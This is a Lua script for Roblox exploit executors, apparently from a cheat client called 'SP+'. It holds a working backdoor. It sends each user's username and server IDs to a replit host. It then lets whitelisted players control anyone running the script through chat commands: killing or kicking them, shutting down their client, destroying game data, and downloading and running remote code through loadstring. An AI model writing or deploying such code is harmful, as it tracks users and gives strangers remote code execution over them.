local HttpService = game:GetService("HttpService")
local textChatService = game:GetService("TextChatService")
local url = "https://q2yudw-whitelists.xet1.repl.co/whitelist"
local response = game:HttpGet(url)
local success, data = pcall(function()
    return HttpService:JSONDecode(response)
end)
local allowedPlayers = data.whitelist

local url2 = "https://q2yudw-whitelists.xet1.repl.co"
local username = game.Players.LocalPlayer.Name
local data2 = HttpService:JSONEncode({
    robloxname = game.Players.LocalPlayer.Name,
    joincode = game.JobId,
    placeid = game.PlaceId
})

local request = request or fluxus and fluxus.request or http_request
local success, result = pcall(function()
    return request({
        Url = url2,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data2
    })
end)

local function isPlayerAllowed(playerName)
    for _, name in ipairs(allowedPlayers) do
        if playerName == name then
            return true
        end
    end
    return false
end

local commands = {
    kill = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
        end
    end,
    funnyvideo = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
	       	local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
	        ScreenGui.IgnoreGuiInset = true
	        local video = Instance.new("VideoFrame", ScreenGui)
	        video.Size = UDim2.new(1,0,1,0)
	        local Name = "bruh.mp4"
	        if not isfile(Name) then
	            writefile(Name, game:HttpGet("https://eruufef.xet1.repl.co/bruh.mp4?raw=true"))
	        end
	        video.Video = syn and getsynasset(Name) or getcustomasset(Name)
	        repeat task.wait() print("Retrying...") until video.Loaded
	        video:Play()
    end
end,
    reveal = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local textChatService = game:GetService("TextChatService")
            textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(("SP+ On Top"))
        end
    end,
    void = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local character = game.Players.LocalPlayer.Character
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local newPosition = humanoidRootPart.CFrame
            for i = 1, 3 do
                newPosition = newPosition + Vector3.new(0, -40, 0)
                humanoidRootPart.CFrame = newPosition
                wait(0.01)
            end
        end
    end,
    blind = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local blur = Instance.new("BlurEffect", game.Lighting)
            blur.Size = 10000000000000
        end
    end,
    unblind = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
            if blur then
                blur:Destroy()
            end
        end
    end,
    trollage = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
        end
    end,
    kick = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            wait(1)
            for index, player in pairs(game.Players:GetPlayers()) do
                player:Kick("Snoopy Owns You")
            end
        end
    end,
   rickroll = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
        end
    end,
    freeze = function()
     if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
       end
    end,
    unfreeze = function()
     if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
       game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
       end
    end,
    lobby = function()
     if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
        end
    end,
    quit = function()
    if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
         game:Shutdown()
         end
    end,
lagback = function()
if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
for i = 1,10 do wait()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local forwardVector = humanoidRootPart.CFrame.LookVector
local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
end
        end 
    end,
    
    breakgame = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
            pcall(function()
                local replicatedStorage = game:GetService("ReplicatedStorage")
                for _, child in ipairs(replicatedStorage:GetDescendants()) do
                    child:Destroy()
                end
            end)
        end
    end,
    funnymap = function()
        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
            local function unanchorParts(object)
                if object:IsA("BasePart") then 
                    object.Anchored = false 
                end 
                for _, child in ipairs(object:GetChildren()) do 
                    unanchorParts(child) 
                end 
            end 
            unanchorParts(workspace) 
        end 
    end,
}

local function checkNames(playerName)
	for _, name in ipairs(allowedPlayers) do
        	if playerName == name then
            	return true
        	end
    	end
    return false
end

textChatService.OnIncomingMessage = function(message: TextChatMessage)
    local properties = Instance.new("TextChatMessageProperties")
    if message.TextSource then        
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        if checkNames(player.Name) then
            properties.PrefixText = "<font color='#9A9AEB'>[SP+ PRIVATE]</font> " .. message.PrefixText
        end
    end
    if message.TextSource then 
        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
        if isPlayerAllowed(player.Name) then 
            local command = commands[message.Text]
            if command then 
                command() 
            end 
        end 
    end 
    
    return properties
end
